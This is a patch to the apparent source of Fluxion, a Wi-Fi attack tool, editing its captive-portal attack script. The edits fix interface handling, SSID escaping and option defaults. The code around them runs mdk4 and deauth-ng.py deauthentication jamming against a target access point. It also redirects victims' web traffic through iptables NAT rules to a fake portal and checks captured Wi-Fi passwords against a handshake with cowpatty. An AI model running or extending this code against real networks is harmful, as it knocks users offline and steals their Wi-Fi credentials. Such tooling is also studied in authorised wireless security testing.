@@ -672,6 +672,9 @@ captive_portal_set_attack() {
       "$FluxionTargetChannel"
 
     CaptivePortalAccessInterface=$APServiceAccessInterface
+  else
+    # When no AP service is used, the access interface is the AP interface itself
+    CaptivePortalAccessInterface="$CaptivePortalAccessPointInterface"
   fi
 
 
@@ -894,7 +897,9 @@ while [ \$AuthenticatorState = \"running\" ]; do
     case "$CaptivePortalAuthenticatorMode" in
       # Cowpatty
       "$CaptivePortalVerificationMethodCowpattyOption")
-        local -r verifiedCondition="cowpatty -f \"$FLUXIONWorkspacePath/candidate.txt\" -r \"$CaptivePortalHashPath\" -s \"$FluxionTargetSSID\" &> $FLUXIONOutputDevice"
+        local escapedSSID
+        printf -v escapedSSID '%q' "$FluxionTargetSSID"
+        local -r verifiedCondition="cowpatty -f \"$FLUXIONWorkspacePath/candidate.txt\" -r \"$CaptivePortalHashPath\" -s $escapedSSID &> $FLUXIONOutputDevice"
         ;;
       # Pyrit
       "$CaptivePortalVerificationMethodPyritOption")
@@ -1205,15 +1210,15 @@ captive_portal_set_routes() {
   iptables --table nat --delete-chain
   iptables -P FORWARD ACCEPT
 
-  iptables -A INPUT -p tcp --dport 443 -j ACCEPT
-  iptables -A INPUT -p tcp --dport 80 -j ACCEPT
-  iptables -A INPUT -p udp --dport 53 -j ACCEPT
-  iptables -A INPUT -p udp --dport 67 -j ACCEPT
+  iptables -A INPUT -i "$CaptivePortalAccessInterface" -p tcp --dport 443 -j ACCEPT
+  iptables -A INPUT -i "$CaptivePortalAccessInterface" -p tcp --dport 80 -j ACCEPT
+  iptables -A INPUT -i "$CaptivePortalAccessInterface" -p udp --dport 53 -j ACCEPT
+  iptables -A INPUT -i "$CaptivePortalAccessInterface" -p udp --dport 67 -j ACCEPT
 
-  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT \
-    --to-destination $CaptivePortalGatewayAddress:80
-  iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT \
-    --to-destination $CaptivePortalGatewayAddress:443
+  iptables -t nat -A PREROUTING -i "$CaptivePortalAccessInterface" -p tcp --dport 80 -j DNAT \
+    --to-destination "$CaptivePortalGatewayAddress":80
+  iptables -t nat -A PREROUTING -i "$CaptivePortalAccessInterface" -p tcp --dport 443 -j DNAT \
+    --to-destination "$CaptivePortalGatewayAddress":443
   iptables -t nat -A POSTROUTING -j MASQUERADE
 }
 
@@ -1642,14 +1647,14 @@ start_attack() {
         "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -f 5 -c $FluxionTargetChannel -a $FluxionTargetMAC" &
     # Save parent's pid, to get to child later.
     CaptivePortalJammerServiceXtermPID=$!
-  elif [[ $option_deauth -eq 1 ]]; then
+  elif [[ "${option_deauth:-0}" -eq 1 ]]; then
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
         "mdk4 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\"" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
-  elif [[ $option_deauth -eq 2 ]]; then
+  elif [[ "${option_deauth:-0}" -eq 2 ]]; then
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
